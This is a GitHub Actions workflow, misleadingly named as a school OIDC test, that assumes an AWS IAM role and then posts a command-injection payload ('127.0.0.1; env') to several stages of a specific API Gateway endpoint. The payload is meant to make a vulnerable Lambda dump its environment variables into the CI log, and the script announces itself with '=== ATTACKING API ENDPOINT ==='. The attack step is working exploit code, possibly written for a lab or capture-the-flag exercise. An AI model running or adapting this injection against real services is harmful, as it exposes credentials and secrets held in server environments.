name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          
          # 1. Define common stages to test
          STAGES=("prod" "dev" "stage" "")
          
          # 2. Payload with command injection
          # We send JSON: {"domain": "google.com; env"}
          PAYLOAD='{"domain": "127.0.0.1; env"}'
          
          echo "=== ATTACKING API ENDPOINT ==="
          
          for STAGE in "${STAGES[@]}"; do
            if [ -z "$STAGE" ]; then
              URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/"
            else
              URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/${STAGE}/"
            fi
            
            echo "Testing URL: $URL"
            
            # Send POST request
            RESPONSE=$(curl -s -X POST "$URL" \
              -H "Content-Type: application/json" \
              -d "$PAYLOAD")
            
            echo "Response: $RESPONSE"
            echo "-----------------------------------"
          done
